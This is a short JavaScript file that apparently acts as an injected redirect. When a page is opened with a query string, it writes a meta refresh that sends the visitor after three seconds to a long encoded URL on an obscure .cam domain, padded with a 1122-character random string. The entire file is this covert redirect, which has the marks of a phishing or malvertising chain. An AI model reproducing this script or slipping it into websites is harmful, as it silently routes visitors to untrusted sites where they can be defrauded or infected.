function string(L) {
  var s = '';
  var randomchar = function() {
    var n = Math.floor(Math.random() * 62);
    if (n < 10) return n; //1-10
    if (n < 36) return String.fromCharCode(n + 55); //A-Z
    return String.fromCharCode(n + 61); //a-z
  }
  while (s.length < L) s += randomchar();
  return s;
};

var fullURL = window.location.href;
let result = fullURL.indexOf("?");

if (result > 0) {
	document.write('<meta http-equiv=refresh content="3; URL=https://pleatcisele.cam/ed/3aOk2sHWISKS_n7S6I6dmuzVsEETRxtZpsHbCYeG4IdUl7WIKarG8LfzhFcUUR_0c5*pPUJ1jS6o8uqPeq5LF7QeSzp4r6QAkWARpEltb8oF4oORiyop049AgE5YpgTiaYNeqvAAwaPBCTJumuskblb6pDbPRWFprJ5dABHcaBqOmbbEA_Xi9HRUeN8dMaccrE45ZxI70NZbchiO4H8bfUz_yyqeAwYVIE48Te1XUFKSKTPWu*_LsQLdhmRW39__YaQUInnasiXKShb7XIq5mE_HDNiVMHe_celjpxv6tzWUKXU9x2BYqt_7dyR41qBJgqt7MQduupQD1CJnMIChtjZJeeW9iqt8F7FVtni9lsH7x_vVCDj5H64Z4Mgfy6QwCiUFmX1gkgG9tqK6tqVQNBkT4xhmw5UlLofEuOeC1ShlpDvHSocdKSFbC57Dz3Vz?md='+string(1122)+'" \/>');
};
